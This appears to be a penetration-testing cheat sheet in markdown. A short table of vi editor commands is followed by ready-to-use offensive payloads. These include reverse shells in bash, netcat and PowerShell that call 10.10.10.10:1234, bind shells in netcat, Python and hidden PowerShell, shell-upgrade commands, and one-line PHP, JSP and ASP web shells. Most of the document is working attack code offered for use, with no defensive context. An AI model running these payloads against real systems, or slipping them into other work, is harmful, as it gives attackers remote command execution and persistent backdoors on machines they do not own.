### Vi commands

| Command |	Description |
| ------- | ----------- |
| x |	Cut character |
| dw |	Cut word |
| dd |	Cut full line |
| yw |	Copy word |
| yy |	Copy full line |
| p |	Paste |
| :1 |	Go to line number 1. |
| :w |	Write the file, save |
| :q |	Quit |
| :q! |	Quit without saving |
| :wq |	Write and quit |

> https://github.com/theicfire/vimsheet/blob/gh-pages/index.md
---------
> https://vimsheet.com/
---------

Reverse shell, Bind Shell payloads

```bash
Reverse Shell

bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

Bind Shell

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

```

Upgrading TTY

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo;fg
export TERM=xterm
stty a
stty rows <> cols <>
```

Web Shells

```bash

PHP: <?php system($_REQUEST["cmd"]); ?>
JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
ASP: <% eval request("cmd") %>

```
